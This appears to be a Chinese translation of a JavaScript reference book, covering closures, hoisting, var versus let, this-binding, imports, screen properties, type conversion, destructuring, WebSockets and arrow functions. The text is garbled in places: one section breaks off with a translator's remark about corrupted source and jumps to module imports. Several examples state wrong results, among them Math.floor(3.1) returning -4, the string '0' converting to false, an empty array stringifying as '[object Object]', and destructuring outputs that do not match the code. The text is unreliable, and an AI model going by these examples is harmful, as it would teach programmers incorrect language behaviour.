  \ a = makeCounter();\nvar b = makeCounter();\na.increment();\nconsole.log(a.value());\
  \ console.log(b.value());\n```\n示例输出：\n1 0\n\n当调用 `makeCounter()` 时，该函数的上下文快照被保存。`makeCounter()`\
  \ 内部的所有代码都使用该快照。两次调用 `makeCounter()` 将创建两个不同的快照，每个都有自己的 `counter` 副本。\n\n### 立即调用函数表达式\
  \ (IIFE)\n\n闭包也被用于防止命名空间污染，通常通过使用立即调用函数表达式实现。\n\n*立即调用函数表达式*（或者称为*自执行匿名函数*）本质上是在声明后立即调用的闭包。IIFE\
  \ 的通用想法是创建一个独立的上下文，供 IIFE 内部的代码访问。\n\n假设我们想要用 `$` 来引用 jQuery。考虑不使用 IIFE 的简单方法：\n\
  \n```javascript\nvar $ = jQuery;\n// 我们通过将 window.$ 赋值给 jQuery 污染了全局命名空间\n```\n\n\
  在下面的示例中，使用了 IIFE 来确保 `$` 只在闭包创建的文中绑定到 jQuery：\n\n```javascript\n(function ($) {\n\
  \  // 这里 $ 被赋值为 jQuery\n})(jQuery);\n// 但不存在 window.$ 绑定，所以没有污染\n```\n\n\n\n\n\n\
  关于闭包的更多信息，请参考 Stackoverflow 上的标准答案。\n\n## 第 56.2 节：提升 (Hoisting)\n\n### 什么是提升？\n\
  \n提升是将所有变量和函数声明移动到它们所在作用域顶部的机制。然而，变量的赋值仍然发生在它们原始的地方。\n\n例如，考虑以下代码：\n\n```javascript\n\
  console. log(foo); // → undefined\nvar foo = 42;\nconsole.log(foo); // → 42\n```\n\
  \n上述代码等同于：\n\n```javascript\nvar foo;\nconsole.log(foo); foo = 42;\nconsole.log(foo);\
  \ // → 提升的变量声明 // → undefined // 变量赋值留在原处 // → 42\n```\n\n注意，由于提升，上述的 `undefined`\
  \ 与运行以下代码产生的“未定义”不同：\n\n```javascript\nconsole.log(foo); // → foo is not defined\n\
  ```\n\n类似的原理也适用于函数。当函数被赋值给变量时（即函数表达式），变量的声明会被提升，而赋值保持在原处。以下两个代码段是等价的：\n\n```javascript\n\
  console.log(foo(2, 3)); // → foo is not a function\nvar foo = function(a, b) { return\
  \ a * b; }\n```\n\n```javascript\nvar foo;\nconsole.log(foo(2, 3)); foo = function(a,\
  \ b) {\n  return a * b;\n}; // → foo is not a function\n```\n\n在声明函数语句时，发生了不同的情况。与函数语句不同，函数声明会被提升到它们作用域的顶部。考虑以下代码：\n\
  \n```javascript\nconsole. log(foo(2, 3)); // → 6\nfunction foo(a, b) {\n  return\
  \ a * b;\n}\n```\n\n由于提升，上述代码与下一个代码段等同：\n\n```javascript\nfunction foo(a, b) { return\
  \ a * b; }\nconsole.log(foo(2, 3)); // → 6\n```\n\n以下是一些关于什么是提升和不是提升的示例：\n\n*有效代码：*\n\
  ```javascript\nfoo();\nfunction foo() {}\n```\n\n*无效代码：*\n```javascript\nbar();\
  \ // → TypeError: bar is not a function\nvar bar = function () {};\n```\n\n*有效代码：*\n\
  ```javascript\nfoo();\nfunction foo() {\n  bar ();\n}\nfunction bar() {}\n```\n\n\
  *无效代码：*\n```javascript\nfoo();\nfunction foo() {\n  bar (); // → TypeError: bar\
  \ is not a function \n}\nvar bar = function () {};\n```\n\n*(E) 有效：*\n```javascript\n\
  function foo() {\n  bar();\n}\nvar bar = function(){}; foo();\n```\n\n### 提升的局限性\n\
  \n变量初始化不能被提升，或者说简单的 JavaScript 提升只包含声明不包含初始化。\n\n例如：下面的脚本将产生不同的输出。\n\n```javascript\n\
  var x = 2;\nvar y = 4;\nalert(x + y);\n```\n这将给你输出 6。但是这个...\n\n```javascript\n\
  var x = 2;\nalert(x + y); var y = 4;\n```\n这会给你输出 `NaN`。由于我们正在初始化 `y` 的值，JavaScript\
  \ 提升并没有发生，因此 `y` 的值将是 `undefined`。JavaScript 会认为 `y` 尚未声明。\n\n所以第二个例子与下面的代码等同：\n\
  \n```javascript\nvar x = 2;\nvar y;\nalert(x + y); y = 4;\n```\n这将给你输出 `NaN`。![](img/image00706.gif)\n\
  \n### 第 56.3 节：var 和 let 的区别\n\n*(注意：所有使用 `let` 的示例也同样适用于 `const`)*\n\n`var` 可于所有版本的\
  \ JavaScript，而 `let` 和 `const` 是 ECMAScript 6 的一部分，仅在较新的浏览器可用。\n\n`var` 作用限于包含它的函数或全局空间，取决于它的何时声明：\n\
  \n```javascript\nvar x = 4; // 全局作用域\nfunction DoThings() {\n  var x = 7; // 函数作用域\n\
  \  console.log(x);\n}\nconsole. log(x); // >> 4\nDoThings(); // >> 7\nconsole.log(x);\
  \ // >> 4\n```\n\n这意味着它可以“逃逸” if 语句和所有类似的块结构：\n\n```javascript\nvar x = 4;\nif (true)\
  \ {\n  var x = 7;\n}\nconsole.log(x); // >> 7\n\nfor (var i = 0; i < 4; i++) {\n\
  \  var j = 10;\n}\nconsole.log(i); // >> 4\nconsole.log(j); // >> 10\n```\n\n相比之下，`let`\
  \ 是块作用域：\n\n```javascript\nlet x = 4;\nif (true) {\n  let x = 7;\n  console.log(x);\
  \ // >> 7\n}\nconsole.log(x); // >> 4\n\nfor (let i = 0; i < 4; i++) {\n  let j\
  \ = 10;\n}\nconsole.log(i); // >> \"ReferenceError: i is not defined\"\nconsole.log(j);\
  \ // >> \"ReferenceError: j is not defined\"\n```\n\n注意 `i` 和 `j` 仅在 `for` 循环中声明，因此在循环之外是未声明的。\n\
  \n还有其他几个关键区别：\n\n#### 全局变量声明\n\n在顶层作用域（任何函数和块之外），`var` 声明会将一个元素放入全局对象。`let` 则不会：\n\
  \n```javascript\nvar x = 4;\nlet y = 7;\nconsole.log(this.x); // >> 4\nconsole.log(this.y);\
  \ // >> undefined\n```\n\n#### 重复声明\n\n使用 `var` 声明变量不会产生错误（尽管它等同于声明一次）：\n\n```javascript\n\
  var x = 4;\nvar x = 7;\n```\n\n使用 `let` 这会产生一个错误：\n\n```javascript\nlet x = 4;\n\
  let x = 7;\n// TypeError: Identifier x has already been declared\n```\n\n当用 `var`\
  \ 声明 `y` 时也是如此：\n\n```javascript\nvar y = 4;\nlet y = 7;\n// TypeError: Identifier\
  \ y has already been declared\n```\n\n然而，用 `let` 声明的变量可以在嵌套块中重用（不是重复声明）：\n\n```javascript\n\
  let i = 5;\n{\n  let i = 6;\n  console.log(i); // >> 6\n}\nconsole.log(i); // >>\
  \ 5\n```\n\n在块内部可以访问外部的 `i`，但如果块内部有 `i` 的 `let` 声明，则无法访问外部的 `i`，如果在第二个声明之前使用它，将抛出\
  \ ReferenceError。\n\n```javascript\nlet i = 5;\n{ \n  i = 6; // 在暂时死区内外部的 i 不用\n\
  \  let i;\n}\n// ReferenceError: i is not defined\n```\n\n#### 提升\n\n用 `var` 和 `let`\
  \ 声明的变量都会被提升。区别在于，用 `var` 声明的变量可以在赋值赋值之前被引用，因为它会被自动赋值（以 `undefined` 为值），但 `let`\
  \ 不能——它明确要求变量在调用之前必须先声明：\n\n```javascript\nconsole.log(x); // >> undefined\nconsole.log(y);\
  \ // >> \"ReferenceError: `y` is not defined\"\n//或者 >> \"ReferenceError: can't\
  \ access lexical declaration `y` before initialization\"\nvar x = 4;\nlet y = 7;\n\
  ```\n\n块开始到 `let` 或 `const` 声明之间的区域被称为暂时死区（Temporal Dead Zone），在该区域对变量的任何引用都会导致\
  \ ReferenceError。即使在声明之前赋值也是如此：\n\n```javascript\ny=7; // >> \"ReferenceError: `y`\
  \ is not defined\"\nlet y;\n```\n\n### 第 56.4 节：Apply 和 Call 的语法与调用\n\n每个函数的 `apply`\
  \ 和 `call` 方法允许为 `this` 提供自定义值。\n\n```javascript\nfunction print() {\n  console.log(this.toPrint);\n\
  }\nprint.apply({ toPrint: \"Foo\" }); // >> \"Foo\"\nprint.call({ toPrint: \"Foo\"\
  \ }); // >> \"Foo\"\n```\n\n你可能会注意到上述调用的语法是相同的。即签名相似。\n\n但它们在用法上有细微区别，由于我们在处理函数并更改其作用域，我们仍然需要保持传递给函数的参数。`apply`\
  \ 和 `call` 都支持如下方式向目标函数传递参数：\n\n```javascript\nfunction speak() {\n  var sentences\
  \ = Array.prototype.slice.call(arguments);\n  console.log(this.name+\": \"+sentences);\n\
  }\nvar person = { name: \"Sunny\" };\nspeak.apply(person, [\"I\", \"Code\", \"Startups\"\
  ]); // >> \"Sunny: I Code Startups\"\nspeak.call(person, \"I\", \"<3\", \"Javascript\"\
  ); // >> \"Sunny: I <3 Javascript\"\n```\n\n注意 `apply` 允许你传递数组或参数对象（类数组）作为参数列表，而\
  \ `call` 需要你单独传递每个参数。\n\n\n\n\n\n这两种方法让你能够随心所欲地进行扩展，例如实现 ECMAScript 原生 `bind` 的简易版本，创建一个始终作为原始函数对象的方法被调用的函数。\n\
  \n```javascript\nfunction bind (func, obj) {\n  return function () {\n    return\
  \ func.apply(obj, Array.prototype.slice.call(arguments, 1));\n  }\n}\n```\n\n`var\
  \ obj = { name: \"Foo\" };\n\nfunction print() {\n  console.log(this.name);\n}\n\
  \nprintObj = bind(print, obj);\n\nprintObj();\n\n这将会记录：\n\n\"Foo\"\n\n`bind` 函数包含了以下操作：\n\
  \n1. `obj` 将被用作 `this` 的值\n2. 将参数传递给函数\n3. 然后返回结果\n\n### 章节 56.5: 箭头函数的调用\n\n版本\
  \ ≥ 6\n\n使用箭头函数时，`this` 取自闭包执行上下文的 `this` 值（也就是说，箭头函数中的 `this` 具有词法作用域，而不是通常的动态作用域）。在全局代码（不属于任何函数的代码）中，它将是全局对象。即使你通过此处描述的任何其他方法调用用箭头语法声明的函数，它依然保持不变。\n\
  \n```javascript\nvar globalThis = this; //在浏览器中是\"window\"，在 Node.js 中是\"global\"\
  \nvar foo = (() => this);\n\nconsole.log(foo() === globalThis); //true\n\nvar obj\
  \ = { name: \"Foo\" };\nconsole.log(foo.call(obj) === globalThis); //true\n```\n\
  \n看 `this` 是如何继承上下文，而不是指向方法被调用的对象。\n\n```javascript\nvar globalThis = this;\nvar\
  \ obj = {\n  withoutArrow: function() {\n    return this;\n  },\n  withArrow: ()\
  \ => this\n};\n\nconsole.log(obj.withoutArrow() === obj); //true\nconsole.log(obj.withArrow()\
  \ === globalThis); //true\n\nvar fn = obj.withoutArrow; // 不再作为方法调用 withoutArrow\n\
  var fn2 = obj.withArrow;\n\nconsole.log(fn() === globalThis); //true\nconsole.log(fn2()\
  \ === globalThis); //true\n```\n\n### 章节 56.6: 绑定调用\n\n每个函数的 `bind` 方法允许你创建一个该函数的新版本，其上下文被严格绑定到特定对象。这在强制函数作为对象的方法进行调用时特别别有用。\n\
  \n```javascript\nvar obj = { foo: 'bar' };\n\nfunction foo() {\n  return this.foo;\n\
  }\n\nfooObj = foo.bind(obj);\n\nfooObj();\n```\n\n这将记录：bar\n\n### 章节 56.7: 方法调用\n\
  \n当作为对象的方法调用函数时，`this` 的值将是该对象。\n\n```javascript\nvar obj = {\n  name: \"Foo\",\n\
  \  print: function () {\n    console.log(this.name)\n  }\n}\n```\n\n我们现在可以将 `print`\
  \ 作为 `obj` 的方法调用。`this` 将是 `obj`。\n\n`obj.print();`\n\n这将记录：Foo\n\n### 章节 56.8:\
  \ 匿名调用\n\n当作为匿名函数调用函数时，`this` 将是全局对象（浏览器中的 self）。\n\n```javascript\nfunction func()\
  \ {\n  return this;\n}\n```\n\n`func() === window; // true`\n\n版本 5\n\n在 ECMAScript\
  \ 5 的严格模式下，如果函数被匿名调用，`this` 将是 `undefined`。\n\n```javascript\n( function () {\n\
  \  \"use strict\";\n  func();\n}())\n```\n\n这将输出 `undefined`\n\n### 章节 56.9: 构造函数调用\n\
  \n当使用 `new` 关键字作为构造函数调用函数时，`this` 取正在构造的对象的值。\n\n```javascript\nfunction Obj(name)\
  \ {\n  this.name = name;\n}\n\nvar obj = new Obj(\"Foo\");\nconsole.log(obj);\n\
  ```\n\n这将记录 { name: \"Foo\" }\n\n### 章节 56.10: 在循环中使用 `let` 代替 `var`（点击处理程序示例）\n\
  \n假设我们需要为 `loadedData` 数组中的每个元素都添加一个按钮（用于点击处理程序）。\n\n（注：此节提供的原始文本在源码中变得重复/混乱，关于循环中\
  \ `let` 与 `var` 的核心逻辑通过文档结构的上下文得以保留）。\n\n\n\n\n\n所有导出的成员现在都可以通过 `test` 变量访问。未导出的成员是不可用的，就像在使用具名成员导入时不可用一样。\n\
  \n**注意：** 模块 `'./test'` 的路径由 `loader` 解析，不属于 ECMAScript 规范的范围。\n\n-   这可以是指向任何资源的字符串（文件系统上的相对或绝对路径、指向网络资源的\
  \ URL 或任何其他字符串标识符）。\n\n### **第 57.5 节：使用别名导入具名成员**\n\n有时你可能会遇到名称非常长的成员，例如：\n\n`thisIsWayTooLongOfAName()`。在这种情况下，你可以导入该成员并为它起一个较短的名字，以便在当前模块中使用：\n\
  \n```javascript\nimport {thisIsWayTooLongOfAName as shortName} from 'module'\n\n\
  shortName()\n```\n\n你可以像这样导入多个长名称成员：\n\n```javascript\nimport {thisIsWayTooLongOfAName\
  \ as shortName, thisIsAnotherLongNameThatShouldNotBeUsed as otherName} from 'module'\n\
  \nshortName()\n\nconsole.log(otherName)\n```\n\n最后，你可以将导入别名与普通成员导入混合：\n\n```javascript\n\
  import {thisIsWayTooLongOfAName as shortName, PI} from 'module'\n\nshortName()\n\
  \nconsole.log(PI)\n```\n\n### **第 57.6 节：带有副作用的导入**\n\n有时你只想导入某个模块是为了执行其顶层代码。这对于填充程序（polyfills）、其他全局变量或仅在模块导入时运行一次的配置有用。\n\
  \n假设有一个名为 `test.js` 的文件：\n\n```javascript\nconsole.log('Initializing...')\n```\n\
  \n你可以这样使用它：\n\n```javascript\nimport './test'\n```\n\n此示例将在控制台打印 `Initializing...`。\n\
  \n### **第 57.7 节：导出多个具名成员**\n\n```javascript\nconst namedMember1 = ...\n\nconst\
  \ namedMember2 = ...\n\nconst namedMember3 = ...\n\nexport { namedMember1, namedMember2,\
  \ namedMember3 }\n```\n\n### **第 58 章：屏幕**\n\n#### **第 58.1 节：获取屏幕分辨率**\n\n要获取屏幕的物理尺寸（包括窗口装饰和菜单栏/启动器）：\n\
  \n```javascript\nvar width = window.screen.width,\n\nheight = window.screen.height;\n\
  ```\n\n### **第 58.2 节：获取屏幕的“可用”区域**\n\n要获取屏幕的“可用”区域（即不包括屏幕边缘的任何栏，但包括窗口装饰）：\n\n```javascript\n\
  var width = window.screen.availWidth,\n\nheight = window.screen.availHeight;\n```\n\
  \n### **第 58.3 节：页面宽度和高度**\n\n要获取页面内容的宽度和高度：\n\n```javascript\nvar width = document.documentElement.clientWidth,\n\
  \nheight = document.documentElement.clientHeight;\n```\n\n### **第 58.4 节：窗口 innerWidth\
  \ 和 innerHeight**\n\n获取浏览器视口的宽度和高度（不包括滚动条）：\n\n```javascript\nvar width = window.innerWidth,\n\
  \nheight = window.innerHeight\n```\n\n### **第 58.5 节：获取颜色深度**\n\n要获取屏幕的像素颜色深度：\n\
  \n```javascript\nvar depth = window.screen.colorDepth;\n```\n\n### **第 59 章：变量类型转换**\n\
  \n#### **59.1：双重否定**\n\n双重否定 `!!` 运算符用于将任何值转换为其等尔等值。它不是一个特殊运算符，而是两个逻辑非操作的序列。\n\n\
  ```javascript\n!!\"hello\" // true\n!!\"\" // false\n!!1 // true\n!!0 // false\n\
  !!undefined // false\n!!null // false\n!!{} // true\n!![] // true\n```\n\n#### **59.2：隐式转换**\n\
  \nJavaScript 经常会在特定上下文中（如 `if` 语句或逻辑运算符）自动将值转换为布尔值。\n\n```javascript\nif (\"hello\"\
  ) {\n  // 这一块会执行\n}\n```\n\n#### **59.3：转换为布尔值**\n\n`Boolean(...)` 将任何数据类型转换为 `true`\
  \ 或 `false`。\n\n```javascript\nBoolean(\"true\") // true\nBoolean(\"false\") //\
  \ false\nBoolean(1) // true\nBoolean(0) // false\nBoolean(\"\") // false\nBoolean(\"\
  1\") // true\nBoolean(\"0\") // true\nBoolean({}) // true\nBoolean([]) // true\n\
  ```\n\n\n\n\n`parseInt('0', 10)` 将将字符串 ('0') 转换为数字 (0)，不要忘记第二个参数，即基数。如果不提供，`parseInt`\
  \ 可能会将字符串转换为错误的数字。\n\n### 第 59.5 节：将数字转换为字符串\n\n`String(0) === '0'`\n\n`String(0)`\
  \ 将数字 (0) 转换为字符串 ('0')。\n\n一种更短但不清晰的写法：\n\n`'' + 0 === '0'`\n\n### 第 59.6 节：原始类型转换表\n\
  \n| 值 | 转换为字符串 | 转换为数字 | 转换为布尔值 |\n| :--- | :--- | :--- | :--- |\n| undefined |\
  \ \"undefined\" | NaN | false |\n| null | \"null\" | 0 | false |\n| true | \"true\"\
  \ | 1 | true |\n| false | \"false\" | 0 | false |\n| NaN | \"NaN\" | NaN | false\
  \ |\n| \"\" 空字符串 | \"\" | 0 | false |\n| \" \" | \" \" | NaN | true |\n| \"2.4\"\
  \ (数字) | \"2.4\" | 2.4 | true |\n| \"test\" (非数字) | \"test\" | NaN | true |\n| \"\
  0\" | \"0\" | 0 | false |\n| -0 | \"0\" | 0 | false |\n| 0 | \"0\" | 0 | false |\n\
  | 1 | \"1\" | 1 | true |\n| Infinity | \"Infinity\" | Infinity | true |\n| -Infinity\
  \ | \"-Infinity\" | Infinity | true |\n| [] | \"[object Object]\" | NaN | true |\n\
  | [3] | \"[object Object]\" | NaN | true |\n| ['a'] | \"[object Object]\" | NaN\
  \ | true |\n| ['a','b'] | \"[object Object]\" | NaN | true |\n| { } | \"[object\
  \ Object]\" | NaN | true |\n| function(){} | \"function(){}\" | NaN | true |\n\n\
  **粗体值**突了程序员可能会感到意外的转换。要显式地转换值，可以使用 `String()`、`Number()`、`Boolean()`。\n\n### 第\
  \ 59.7 节：将数组转换为字符串\n\n`Array.join(separator)` 可将数组作为字符串输出，并带有可配置的分隔符。\n\n默认（separator\
  \ = \",\"）：\n\n`[\"a\", \"b\", \"c\"].join() === \"a,b,c\"`\n\n使用字符串分隔符：\n\n`[1,\
  \ 2, 3, 4].join(\" + \") === \"1 + 2 + 3 + 4\"`\n\n使用空分隔符：`[\"B\", \"o\", \"b\"\
  ].join(\"\") === \"Bob\"`\n\n### 第 59.8 节：使用数组方法将数组转换为字符串\n\n这种方法看起来可能没用，因为你正在使用匿名函数来完成原本用\
  \ `join()` 就能完成的事情；但如果你在数组转换为字符串的过程中需要对内容进行某些处理，这可能是非常有用的。\n\n```javascript\nvar\
  \ arr = ['a', 'á', 'b', 'c']\n\nfunction upper_lower (a, b, i) {\n  //...在此处做一些操作\n\
  \  b = i & 1 ? b.toUpperCase() : b.toLowerCase();\n  return a + ',' + b\n}\n\narr\
  \ = arr.reduce(upper_lower); // \"a,*Á*,b,C\"\n```\n\n### 第 59.9 节：将数字转换为布尔值\n\n\
  `Boolean(0) === false`\n\n`Boolean(0)` 将数字 0 转换为布尔值 `false`。\n\n一种更短但不清晰的写法：\n\n\
  `!!0 === false`\n\n### 第 59.10 节：将字符串转换为布尔值\n\n将字符串转换为布尔值使用：\n\n`Boolean(myString)`\n\
  \n或更短但不清晰的形式：\n\n`!!myString`\n\n除了空字符串（长度为零）外，所有字符串在作为布尔值时都被求值为 `true`。\n\n`Boolean\
  \ ('') === false // 为 true`\n`Boolean(\"\") === false // 为 true`\n`Boolean('0')\
  \ === false // 为 false`\n`Boolean('any_non_empty_string') === true // 为 true`\n\n\
  ### 第 59.11 节：整数转浮点数\n\n在 JavaScript 中，所有数字内部都表示为浮点数。这意味着只需将你的整数作为浮点数使用即可完成转换。\n\
  \n### 第 59.12 节：浮点数转整数\n\n要将浮点数转换为整数，JavaScript 提供了多种方法。\n\n`floor` 函数返回小于或等于浮点数的第一个整数。\n\
  \n`Math.floor(5.7); // 5`\n\n`ceil` 函数返回大于或等于浮点数的第一个整数。\n\n`Math.ceil(5.3); // 6`\n\
  \n`round` 函数对浮点数进行四舍五入。\n\n`Math.round(3.2); // 3`\n`Math.round(3.6); // 4`\n\n\
  版本 ≥ 6\n\n截断 (trunc) 移除浮点数的小数。\n\n`Math.trunc(3.7); // 3`\n\n注意截断 (trunc) 和向下取整\
  \ (floor) 的区别：\n\n`Math.floor(3.1); // -4`\n`Math.trunc(3.1); // -3`\n\n### 第 59.13\
  \ 节：字符串转浮点数\n\n`parseFloat` 接受字符串作为参数并将其转换为浮点数 `/parseFloat(\"10.01\") // = 10.01`\n\
  \n### 第 60 章：解构赋值\n\n解构是一种最近在 ECMAScript 6 中添加到 JavaScript 的**模式匹配**技术。\n\n它允许当模式与表达式的右侧和左侧匹配时，将一组变量绑定到一组对应的值上。\n\
  \n### 第 60.1 节：对象解构\n\n解构是从对象中提取属性到变量中的一种方便方法。\n\n基本语法：\n\n```javascript\nlet person\
  \ = {\n  name: 'Bob',\n  age: 25\n};\n```\n\n```javascript\nlet { name, age } =\
  \ person; // 等于 let name = person.name; let age = person.age;\n```\n\n解构与重命名：\n\n\
  ```javascript\nlet person = {\n  name: 'Bob',\n  age: 25\n};\nlet { name: firstName\
  \ } = person; // 等于 let firstName = person.name;\n```\n\n带有默认值的解构：\n\n```javascript\n\
  let person = {\n  name: 'Bob',\n  age: 25\n};\nlet { phone = '123-456-789' } = person;\
  \ // 等于 let phone = person.hasOwnProperty('phone') ? person.phone : '123-456-789';\n\
  ```\n\n带有默认值的解构与重命名：\n\n```javascript\nlet person = {\n  name: 'Bob',\n  age: 25\n\
  };\nlet { name: p, age = 30 } = person; // 等于 let p = person.name; let age = person.hasOwnProperty('age')\
  \ ? person.age : 30;\n```\n\n### 第 60.2 节：参数解构\n\n从传递给函数的对象中提取属性。这种模式模拟了命名参数，而不是依赖于参数的位置。\n\
  \n```javascript\nlet user = {\n  name: 'Jill',\n  age: 33,\n  profession: 'Pilot'\n\
  }\n\nfunction greeting ({name, profession}) {\n  console.log(`Hello, ${name} ${profession}`)\n\
  }\ngreeting(user)\n```\n\n这也适用于数组：\n\n```javascript\nlet parts = [\"Hello\", \"\
  World!\"];\nfunction greeting([first, second]) {\n  console.log(`${first} ${second}`);\n\
  }\n```\n\n### 第 60.3 节：嵌套解构\n\n我们不仅限于解构对象/数组，还可以解构嵌套的对象/数组。\n\n**嵌套对象解构**\n\n```javascript\n\
  var obj = {\n  a: {\n    c: 1,\n    d: 3\n  },\n  b: 2\n};\nvar {\n  a: {\n    c:\
  \ x,\n    d: y\n  },\n  b: z\n} = obj;\nconsole.log(x, y); // 1,2\n```\n\n**嵌套数组解构**\n\
  \n```javascript\nvar arr = [1, 2, [3, 4], 5];\nvar [a, [b, c], d] = arr;\nconsole.log(a,\
  \ b, c, d); // 1345\n```\n\n解构不仅限于单一模式，我们可以在其中包含数组并具有 n 层嵌套。同样，我们可以解构包含对象的数组，反之亦然。\n\
  \n**对象中的数组**\n\n```javascript\nvar obj = { \n  a: 1,\n  b: [2, 3]\n};\nvar {\n \
  \ a: x1,\n  b: [x2, x3]\n} = obj; // 注意：此处原文逻辑略有误，译文按原意结构翻译\n```\n\n**数组中的对象**\n\
  \n```javascript\nvar arr = [1, 2, {a: 3}, 4];\nvar [x1, x2, {a: x3}, x4] = arr;\n\
  console.log(x1, x2, x3, x4); // 1234\n```\n\n### 第 60.4 节：数组解构\n\n```javascript\n\
  const myArr = ['one', 'two', 'three']\nconst [ a, b, c ] = myArr // a='one', b='two',\
  \ c='three'\n```\n\n我们可以在数组解构中设置默认值，参见默认值解构示例。\n\n通过数组解构，我们可以轻松地交换两个变量的值：\n\n```javascript\n\
  var a = 1; \nvar b = 3;\n[a, b] = [b, a]; // a = 3, b = 1\n```\n\n我们可以指定空槽来跳过不需要的值：`[a,\
  \ , b] = [1, 2, 3] // a = 1, b = 3`\n\n### 第 60.5 节：变量内部解构\n\n除了将对象解构到函数参数中，你还可以这样在变量声明中使用它们：\n\
  \n```javascript\nconst person = {\n  name: 'John Doe',\n  age: 45,\n  location:\
  \ 'Paris, France',\n};\nlet { name, age, location } = person;\nconsole.log('I am\
  \ ' + name + ', aged ' + age + ' and living in ' + location + '.'); // \"I am John\
  \ Doe, aged 45 and living in Paris, France.\"\n```\n\n可以看到，创建了三个变量：`name`、`age`\
  \ 和 `location`，如果键名匹配，将从对象 `person` 中获取它们的值。\n\n### 第 60.6 节：解构时的默认值\n\n我们经常遇到尝试提取的属性不存在于对象/数组的情况，导致\
  \ `TypeError`（解构嵌套对象时）或被设置为 `undefined`。在解构时，我们可以设置一个默认值，如果在对象中未找到，它将退而使用该值。\n\n\
  ```javascript\nvar obj = {a : 1};\nvar {a : x , b : x1 = 10} = obj; \nconsole.log(x,\
  \ x1); // 1, 10\n```\n\n```javascript\nvar arr = [];\nvar [a = 5, b = 10, c] = arr;\n\
  ```\n\n\n\n\n\n```javascript\nconsole.log(a, b, c); // 5, 10, undefined\n```\n\n\
  # 60.7 节：解构时的重命名变量\n\n解构允许我们引用对象中的一个键，但将其声明为不同名称的变量。该语法看起来与普通 JavaScript 对象的键值语法相似。\n\
  \n```javascript\nlet user = {\n  name: 'John Smith',\n  id: 10,\n  email: 'johns@workcorp.com',\n\
  };\n\nlet {user: userName, id: userId} = user;\n\nconsole.log(userName) // John\
  \ Smith\nconsole.log(userId) // 10\n```\n\n# 第 61 章：WebSockets\n\n## 参数详情\n\n- `url`:\
  \ 支持此 web socket 连接的服务器 url。\n- `data`: 要发送给主机的内容。\n- `message`: 从主机接收到的消息。\n\n\
  `WebSocket` 是一种协议，允许客户端和服务器之间的双向通信：\n\n`WebSocket` 的目标是为需要与服务器进行双向通信的浏览器应用程序提供一种机制，这种机制不依赖于打开多个\
  \ HTTP 连接（RFC 6455）。\n\n`WebSocket` 在 HTTP 协议上运行。\n\n## 61.1 节：处理字符串消息\n\n```javascript\n\
  var wsHost = \"ws://my-sites-url.com/path/to/echo-web-socket-handler\";\nvar ws\
  \ = new WebSocket(wsHost);\nvar value = \"an example message\";\n\n// onmessage\
  \ : 事件监听器 - 当从服务器接收消息时触发\nws.onmessage = function(message) {\n  if (message ===\
  \ value) {\n    console.log(\"The echo host sent the correct message.\");\n  } else\
  \ {\n    console.log(\"Expected: \" + value);\n    console.log(\"Received: \" +\
  \ message);\n  }\n};\n\n// onopen : 事件监听器 - 当 websockets readyState 改变为 open 时触发事件，这意味着我们现在准备好从服务器发送和接收消息\n\
  ws.onopen = function() {\n  // send 用于向服务器发送消息\n  ws.send(value);\n};\n```\n\n##\
  \ 61.2 节：建立 web socket 连接\n\n```javascript\nvar wsHost = \"ws://my-sites-url.com/path/to/web-socket-handler\"\
  ;\nvar ws = new WebSocket(wsHost);\n```\n\n## 61.3 节：处理二进制消息\n\n```javascript\n\
  var wsHost = \"http://my-sites-url.com/path/to/echo-web-socket-handler\";\nvar ws\
  \ = new WebSocket(wsHost);\nvar buffer = new ArrayBuffer(5); // 5 字节缓冲区\nvar bufferView\
  \ = new DataView(buffer);\n\nbufferView.setFloat32(0, Math.PI);\nbufferView.setUint8(4,\
  \ 127);\n\nws.binaryType = 'arraybuffer';\nws.onmessage = function(message) {\n\
  \  var view = new DataView(message.data);\n  console.log('Uint8:', view.getUint8(4),\
  \ 'Float32:', view.getFloat32(0))\n};\nws.onopen = function() {\n  ws.send(buffer);\n\
  };\n```\n\n## 61.4 节：建立安全的 web socket 连接\n\n```javascript\nvar sck = \"wss://site.com/wss-handler\"\
  ;\nvar wss = new WebSocket(sck);\n```\n\n这使用 `wss` 而不是 `ws` 来建立安全的 web socket 连接，利用了\
  \ HTTPS 而不是 HTTP。\n\n# 第 62 章：箭头函数\n\n箭头函数是 ECMAScript 2015 (ES6) 中编写匿名、词法作用域函数的简洁方式。\n\
  \n## 62.1 节：引言\n\n在 JavaScript 中，函数可以使用“箭头” (`=>`) 语法匿名地定义，由于与 Common Lisp 的相似性，它有时被称为\
  \ *lambda 表达式* (lambda expression)。\n\n箭头函数最简单的形式是其参数在 `=>` 的左侧，返回值在右侧：\n\n`item\
  \ => item + 1` // -> function(item){return item + 1}\n\n可以通过向该表达式提供参数来立即调用此函数：\n\
  \n`(item => item + 1)(41)` // -> 42\n\n如果箭头函数只有一个参数，则该参数周围的括号是可选的。例如，以下表达式将相同类型的函数赋值给常量变量：\n\
  \n```javascript\nconst foo = bar => bar + 1;\nconst bar = (baz) => baz + 1;\n```\n\
  \n然而，如果箭头函数没有参数或有多个参数，则*必须*用一组新的括号包围所有参数：\n\n`(() => \"foo\")()` // -> \"foo\"\n\
  `((bow, arrow) => bow + arrow)('I took an arrow ', 'to the knee...')` // -> \"I\
  \ took an arrow to the knee...\"\n\n如果函数体不由单个表达式组成，它必须被括号包围并使用显式的 `return` 语句提供结果：\n\
  \n```javascript\n( bar => {\n  const baz = 41;\n  return bar + baz;\n})(1); // ->\
  \ 42\n```\n\n如果箭头函数的体仅由对象字面量组成，则该对象字面量必须包含括号内：\n\n`(bar => ({ baz: 1 }))()` // ->\
  \ Object {baz: 1}\n\n额外的括号表示开启和关闭括号是对象字面量的一部分，即它们不是分隔符。\n\n## 62.2 节：词法作用域与绑定\n\n\
  箭头函数是词法作用域的，这意味着它们的 `this` 绑定是在定义时绑定的，而不是在调用时。\n\n箭头函数 own 自己的 `this`，它们不会创建自己的\
  \ `this` 绑定。\n\n```javascript\nclass Person {\n  constructor(name) {\n    this.name\
  \ = name;\n  }\n  sayHi() {\n    setTimeout(function() {\n      console.log(\"Hi,\
  \ my name is \" + this.name);\n    }, 100);\n  }\n}\n\nconst p = new Person(\"John\"\
  );\np.sayHi(); // Hi, my name is undefined\n```\n\n使用箭头函数，可以解决这个问题：\n\n```javascript\n\
  class Person {\n  constructor(name) {\n    this.name = name;\n  }\n  sayHi() {\n\
  \    setTimeout(() => {\n      console.log(\"Hi, my name is \" + this.name);\n \
  \   }, 100);\n  }\n}\n\nconst p = new Person(\"John\");\np.sayHi(); // Hi, my name\
  \ is John\n```\n\n## 62.3 节：arguments 对象\n\n箭头函数不暴露 `arguments` 对象；因此，`arguments`\
